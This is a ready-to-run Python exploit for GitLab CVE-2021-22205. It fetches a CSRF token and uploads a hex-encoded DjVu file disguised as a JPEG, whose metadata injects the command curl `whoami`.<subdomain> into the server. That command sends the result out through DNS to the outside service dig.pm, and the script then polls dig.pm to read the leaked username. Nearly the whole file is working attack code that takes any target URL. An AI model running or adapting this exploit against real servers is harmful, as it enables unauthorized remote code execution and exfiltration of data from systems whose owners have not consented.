import codecs,requests,random,time,json,argparse,sys
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
codecs.register_error("strict", codecs.ignore_errors)

def get_Dnslogger():
    dnslog_base = "https://dig.pm/"
    dnslog_domains = requests.get("{0}get_domain".format(dnslog_base)).json()
    if len(dnslog_domains) < 1:
        exit("Maybe `dig.pm` is down..")
    dnslog_domain = random.choice(dnslog_domains)
    dnslog_subdomain = requests.post(
        "{0}get_sub_domain".format(dnslog_base), data={"domain": dnslog_domain}
    ).json()
    print("[+] Got dnslog domain: %s"%dnslog_subdomain['domain'])
    return(dnslog_domain,dnslog_subdomain)

def query_Logger(dnslog_domain,dnslog_subdomain):
    res = requests.post(
        "{0}get_results".format("https://dig.pm/"),
        data={"domain": dnslog_domain, "token": dnslog_subdomain["token"]},
    ).text
    return res

def exploit(url):
    #Get dnslog domain
    dnslog_domain, dnslog_subdomain = get_Dnslogger()
    
    #Send payload
    session = requests.Session()
    try:
        print("[+] Grabbing CSRF token")
        r = session.get(url.rstrip("/") + "/users/sign_in", verify=False)
    except ConnectionError:
        print("[-] Target connection failed!")
    else:
        soup = BeautifulSoup(r.text, features="lxml")
        token = soup.findAll('meta')[16].get("content")
        print("[+] csrf token:{}".format(token))
        
        headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
                "Connection": "close",
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"
        }

        payload_P1 = codecs.decode('0D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358350D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2266696C65223B2066696C656E616D653D22746573742E6A7067220D0A436F6E74656E742D547970653A20696D6167652F6A7065670D0A0D0A41542654464F524D000003AF444A564D4449524D0000002E81000200000046000000ACFFFFDEBF992021C8914EEB0C071FD2DA88E86BE6440F2C7102EE49D36E95BDA2C3223F464F524D0000005E444A5655494E464F0000000A00080008180064001600494E434C0000000F7368617265645F616E6E6F2E696666004247343400000011004A0102000800088AE6E1B137D97F2A89004247343400000004010FF99F4247343400000002020A464F524D00000307444A5649414E546100000150286D657461646174610A0928436F7079726967687420225C0A22202E2071787B','hex')
        payload_Command = ("curl `whoami`.%s"%dnslog_subdomain['domain']).encode()
        payload_P2 = codecs.decode('7D202E205C0A2220622022292029202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020200A0D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358352D2D0D0A','hex')
        data=payload_P1 + payload_Command + payload_P2

        print("[+] Executing command: whoami")

        resp = session.post(url.rstrip("/") + "/uploads/user", data=data, headers=headers, verify=False)

        if "The change you requested was rejected." in resp.text or resp.status_code == 200:
            print("[-] Target: {} gitlab rce failure".format(url))
        elif "Failed to process image" in resp.text:
            print("[+] Target: {} gitlab rce ok !!!".format(url))

            print("[!] Try to get command result from dnslogger")
            result = query_Logger(dnslog_domain, dnslog_subdomain)
            if result == "null":
                print("[-] Command execution failed! (probably dnslog platform got traffic block)")
            else:
                print("[+] Get command result: ")
                result = json.loads(result)
                #print(result)
                print(result["0"]["subdomain"].split(".")[0])

    
if __name__=='__main__':
    
    parser = argparse.ArgumentParser(add_help = True, description = "Just a simple exploit for gitlab CVE-2021-22205")
    
    parser.add_argument("-u",'-url',action='store',help="Specify your target")

    options = parser.parse_args()

    if options.u is None:
        parser.print_help()
        sys.exit(1)
    
    exploit(options.u)

